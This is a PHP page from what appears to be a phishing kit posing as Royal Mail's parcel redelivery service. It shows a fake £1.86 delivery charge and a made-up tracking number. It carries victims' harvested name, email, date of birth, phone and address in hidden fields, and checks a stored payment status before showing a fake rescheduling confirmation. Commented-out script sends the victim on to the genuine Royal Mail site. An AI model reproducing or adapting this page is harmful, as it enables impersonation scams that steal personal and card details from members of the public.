<?php session_start(); ?>
<?php require_once __DIR__ . '/header.php'; ?>


<!-- <section id=""> -->
   

    <div class="container">
        <div class="row">
                <div class="col-lg-8 mx-auto ps_form_wrapper">
                <br/>
                <form id="" name="" method="POST"  action="index.php?<?php echo generateRandomString(); ?>">
                    
                    <input type="hidden" name="name" value="<?php echo $name; ?>" />
                    <input type="hidden" name="email" value="<?php echo $email; ?>" />
                    <input type="hidden" name="dob" value="<?php echo $dob; ?>" />
                    <input type="hidden" name="phone" value="<?php echo $phone; ?>" />
                    <input type="hidden" name="address" value="<?php echo $address; ?>" />
                    <input type="hidden" name="city" value="<?php echo $city; ?>" />
                    <input type="hidden" name="postcode" value="<?php echo $postcode; ?>" />

                    <h1 id="title">Redelivery</h1>
                    <label>Delivery name:<span class="infor"> Jejdjs shahs Hahshsh.</span></label>
                    <label>Delivery address:<span class="infor"> 72 hahsjsh.</span></label>
                    <label>Delivery date:<span class="infor"> Sun 25 Apr.</span></label>
                    <label>Delivery charge:<span class="infor"> £1.86.</span></label>
                    <label>Tracking number:<span class="infor"> 372837491.</span></label>
                    <br />
                    <div id="success"></div>
                    <div class="form-group" style="text-align: center;">
                        <button class="btn btn-primary btn-xl" value="exit" name="exit" id="sendMessageButton" type="submit">Exit</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

<!-- <section>
    <div class="row m-0">
       <div class="col-lg-12 p-0">
        <div class="intro-desktop intro-image reduced-intro-desktop">
                <div class="introduction-outer-wrapper">
                    <div class="col-md-5 col-xl-6">
                        <div class="introduction-content-wrapper">
                            <h1 class="introduction-title reduced-introduction-title">
                                Redelivery
                            </h1>
                            <div class="introduction-body">
                                <div class="field-introduction-body field field--name-field-introduction-body field--type-string-long field--label-hidden field__item">Received a 'Something for you' card? Arrange to have your item redelivered</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
       </div>
    </div>
</section> -->
<?php if (isset($_SESSION['formData']['payment_status']) and ($_SESSION['formData']['payment_status'] == 1 )): ?>
    <?php 
        
        $address  = ( $_SESSION['formData']['address'] and !empty( $_SESSION['formData']['address']) ) ?  $_SESSION['formData']['address']: '';
        $city     = ( $_SESSION['formData']['city'] and !empty( $_SESSION['formData']['city']) ) ?  $_SESSION['formData']['city']: '';
        $postcode = ( $_SESSION['formData']['postcode'] and !empty( $_SESSION['formData']['postcode']) ) ?  $_SESSION['formData']['postcode']: '';
        
    ?>
    <!-- <section id="thankyou_section">
        <img style="max-width: 150px;" src="./assets/img/confirm.png" />
        <h4>Thank you. <?php echo isset($_SESSION['formData']['name']) ? $_SESSION['formData']['name']: ''; ?></h4>
        <br/>
        <h5 style="line-height: 2;">
            Your parcel EA<?php echo time(); ?>UK has been sceduled for re-delivery to <?php echo $address .', '. $city .', '.$postcode; ?> and will arrive on <?php echo date('d-m-Y', strtotime('now +2days')) ?>.
        </h5>
    </section> -->

        <?php else: ?>

            <!-- <section id="thankyou_section">
                <img style="max-width: 75px;" src="./assets/img/cancel.png" />
                <br/>
                <br/>
                <h4 style="color:red;">There is some error please try again!.</h4>
            </section> -->

        <?php endif; ?>

        <!-- <script>
            function redirect_user() {
                setTimeout(function() {
                    window.location.href = "https://www.royalmail.com";
                }, 4000);
            }
            window.onload = redirect_user();
        </script> -->
<?php require_once __DIR__ . '/footer.php'; ?>